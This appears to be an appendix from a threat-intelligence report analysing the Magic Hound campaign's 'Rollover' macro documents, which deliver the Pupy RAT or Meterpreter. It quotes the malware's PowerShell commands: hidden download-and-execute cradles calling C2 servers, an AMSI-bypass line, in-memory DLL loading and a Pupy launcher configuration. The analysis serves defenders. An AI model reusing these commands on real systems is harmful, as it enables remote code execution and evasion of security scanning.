@@ -1,0 +1,74 @@
+Appendix
+MAGICHOUND.ROLLOVER
+The Magic Hound campaign used Word and Excel documents as a delivery method, specifically�
+documents that contain a malicious macro that attempts to load either the Pupy RAT or possibly
+Meterpreter. We call this tool MagicHound.Rollover. In one example, the Word document contained a
+button with the label “First click “Enable Content” above the page, then click here to fill out the form”�
+This string attempts to trick the user into enabling macros to execute the malicious code within the
+macro. When the macro executes, it unhides a table that contains the contents of a legitimate
+document in an attempt to make the user less suspicious of the malicious activities occurring in the
+background. The macro contains malicious code that attempts to download content from a remote
+server.
+The macro uses PowerShell to download a shellcode-based payload from a remote server using one
+of two available techniques. The first technique is rather straightforward, using PowerShell’s “iex”�
+function to execute a string obtained from a remote server. The macro carries out this first technique�
+by running the following command:
+1 powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString('hxxp
+The code above generates the following HTTP request, which the C2 server would then respond to
+with a script that PowerShell would execute:
+GET /eiloShaegae1 HTTP/1.1
+Host: 139.59.46[.]154:3485
+Connection: Keep-Alive
+The second method involves using PowerShell to create a thread to execute a buffer of shellcode,�
+which we believe the threat actors obtained from the Magic Unicorn source code. The Unicorn
+source code contains a comment for this specific PowerShell command, which is described as a�
+“one line shellcode injection with native x86 shellcode”.
+The shellcode begins with a stub that is responsible for decrypting additional shellcode. To decrypt
+the additional shellcode, the stub code will start with an initial key, such as 0x6CAF9362 and XOR
+the first DWORD of the additional shellcode. It will then add the resulting DWORD to the key that the�
+stub code will use to decrypt the second DWORD and so on. After we decrypted the additional
+shellcode, we determined that the functional shellcode is part of the Metasploit Framework,
+specifically using the block_api.asm code to resolve API function names and the�
+block_reverse_http.asm code to obtain additional shellcode to execute on the system. The assembly
+code used to create the shellcode can be obtained from:
+https://github.com/rapid7/metasploit-
+framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm
+https://github.com/rapid7/metasploit-
+framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_http.asm
+The purpose of the shellcode is to obtain additional shellcode to execute using an HTTP request to
+the URL “hxxp://45.76.128[.]165:4443/0w0O6”. We are unsure of the shellcode hosted at this URL,
+but it is possible that additional shellcode-based payloads like Meterpreter could have been served
+by this shellcode.
+Two Rollover delivery documents (SHA256:
+6c195ea18c05bbf091f09873ed9cd533ec7c8de7a831b85690e48290b579634b and SHA256:
+218fac3d0639c0d762fcf71685bcf6b64c33d1533df03b4cf223d9b07ca1e3c2) attempted to
+communicate with the URL hxxp://139.59.46[.]154:3485/eiloShaegae1 to obtain additional code to
+execute. On January 1, 2017, we observed this URL responding to the above HTTP request with the
+following data:
+1 powershell.exe -exec bypass -window hidden -noni -nop -encoded JABjAG8AbQBtAGEAbgBkACAAPQAgACcAVw
+As you can see, the C2 server responds with a PowerShell command that will run on the system. The
+PowerShell command decodes to the following:
+The script above checks the system architecture to determine if it is an x64 machine and attempts to
+execute a base64 encoded command that decodes to the following:
+1
+2
+3
+4
+5
+[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+try{
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', '
+}catch{}
+IEX (New-Object Net.WebClient).DownloadString('http:// 139.59.46[.]154:3485 /IMo8oosieVai');
+This decoded PowerShell script attempts to download and execute a file using HTTP from the URL�
+“hxxp:// 139.59.46[.]154:3485 /IMo8oosieVai”. The C2 server will respond to this HTTP GET request
+with a large amount of data that includes a PowerShell script that also contains a DLL payload that is
+embedded as a series of base64 encoded chunks, that is then decoded using the following code:
+1 $PEBytesTotal = [System.Convert]::FromBase64String($PEBytes0+$PEBytes1+$PEBytes2+$PEBytes3+$PEByte
+The PowerShell script loads the DLL payload directly into memory without saving it to the disk. The
+Pupy payload was generated using the following configuration, which shows the C2 IP/port and the�
+use of the “obfs3” transport:
+1 LAUNCHER_ARGS=['--host', '139.59.46[.]154:3543', '-t', 'obfs3']
+It appears the adversary used a majority of the following Pupy module to create the PowerShell
+commands used in the delivery documents:
+https://github.com/n1nj4sec/Pupy/blob/master/Pupy/Pupylib/payloads/ps1_oneliner.py
